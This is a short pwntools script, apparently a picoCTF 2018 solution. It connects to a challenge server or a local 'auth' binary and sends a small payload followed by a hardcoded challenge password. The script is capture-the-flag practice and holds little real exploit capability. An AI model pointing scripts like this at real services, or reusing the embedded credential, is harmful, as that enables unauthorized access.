from pwn import *
import json

LOCAL = False # If set to false then you will try to connect to the pico server
CYCLIC_FOUND = True # If set to false then you will run a cyclic search to find offset

local_bin = './auth'
elf = ELF(local_bin)

'''
If you are running this on your local machine then all you need is to start
the process. However, if you are trying to solve on the server then you must
set up the ssh conection and begin the process by actually sending a line with
the execution statement in it
'''
if(LOCAL):
    p = process(local_bin)

else:
    #nc 2018shell.picoctf.com 1271
    p = remote('2018shell.picoctf.com',1271)

print()
print p.recvline()
payload = "A"*2
p.sendline(payload)
print p.recv()
password = "password123"
if not LOCAL:
    password = "a_reAllY_s3cuRe_p4s$word_f78570"
p.sendline(password)
print p.recvall()
